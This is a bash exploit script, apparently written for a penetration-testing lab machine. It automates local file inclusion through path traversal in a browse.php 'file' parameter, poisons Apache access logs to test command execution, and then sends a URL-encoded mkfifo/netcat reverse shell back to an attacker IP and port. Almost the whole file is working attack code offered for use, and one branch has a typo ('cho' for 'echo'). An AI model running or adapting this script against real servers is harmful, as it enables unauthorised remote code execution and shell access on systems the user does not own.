#!/bin/bash

echo -e '\E[31;40m'' _____ _____  _____     _     _____ _____    ______ _____ _____ _____ _____ _____ _   _ '
echo -e '\E[32;40m''|  _  |  __ \/  __ \   | |   |  _  |  __ \   | ___ \  _  |_   _/  ___|_   _|  _  | \ | |'
echo -e '\E[33;40m''| | | | |  \/| /  \/   | |   | | | | |  \/   | |_/ / | | | | | \ `--.  | | | | | |  \| |'
echo -e '\E[34;40m''| | | | | __ | |       | |   | | | | | __    |  __/| | | | | |  `--. \ | | | | | | . ` |'
echo -e '\E[35;40m''\ \_/ / |_\ \| \__/\   | |___\ \_/ / |_\ \   | |   \ \_/ /_| |_/\__/ /_| |_\ \_/ / |\  |'
echo -e '\E[36;40m'' \___/ \____/ \____/   \_____/\___/ \____/   \_|    \___/ \___/\____/ \___/ \___/\_| \_/'
echo -e '\E[37;40m''                                                                                        '; tput sgr0

lhost="10.10.14.5" #Your attacker IP
lport="4242" #Your listening port
rhost="10.10.10.84" #ip address or name (no http needed)
rport="80" #rport for web server such as 80
log_location="" #this is usually either /var/log/httpd-access.log or /var/log/apache2/access.log if unkown we will try both ways... just send it!!!!

if [ $log_location ]
then 
	cho -e '\E[31;40m''Testing log poisioning first';tput sgr0
	curl -s "http://$rhost:$rport/browse.php?file=../../../../../../../../../../../../$log_location&cmd=id" > web.txt
	grep uid web.txt
	if [ $? = 0 ]; then
		echo -e '\E[31;40m''We have log poisioning, trying a reverse shell';tput sgr0
		read -p "Start listener on port $lport, press enter when ready"
		curl -s "http://$rhost:$rport/browse.php?file=../../../../../../../../../../../../$log_location&cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20$lhost%20$lport%20%3E%2Ftmp%2Ff"
	else
		echo -e '\E[31;40m''Something went wrong, may need to exploit yourself'
	fi
else
	echo -e '\E[31;40m''Testing log poisioning first, for both access logs';tput sgr0
	curl -s "http://$rhost:$rport/browse.php?file=../../../../../../../../../../../../var/log/apache2/access.log&cmd=id" > web.txt
	curl -s "http://$rhost:$rport/browse.php?file=../../../../../../../../../../../../var/log/httpd-access.log&cmd=id" > web1.txt
	grep uid web.txt
	if [ $? = 0 ]; then
		echo -e '\E[31;40m''We have log poisioning in /var/log/apache2/access.log, trying a reverse shell';tput sgr0
		read -p "Start listener on port $lport, press enter when ready"
		curl -s "http://$rhost:$rport/browse.php?file=../../../../../../../../../../../../var/log/apache2/access.log&cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20$lhost%20$lport%20%3E%2Ftmp%2Ff"
	else
		echo -e '\E[31;40m''Not in /var/log/apache2/access.log'; tput sgr0
	fi
	grep uid web1.txt
	if [ $? = 0 ]; then
		echo -e '\E[32;40m''We have log poisioning in /var/log/httpd-access.log, trying a reverse shell';tput sgr0
		read -p "Start listener on port $lport, press enter when ready"
		curl -s "http://$rhost:$rport/browse.php?file=../../../../../../../../../../../../var/log/httpd-access.log&cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20$lhost%20$lport%20%3E%2Ftmp%2Ff"
	else
		echo -e '\E[31;40m''Not in /var/log/httpd-access.log'; tput sgr0
	fi
fi
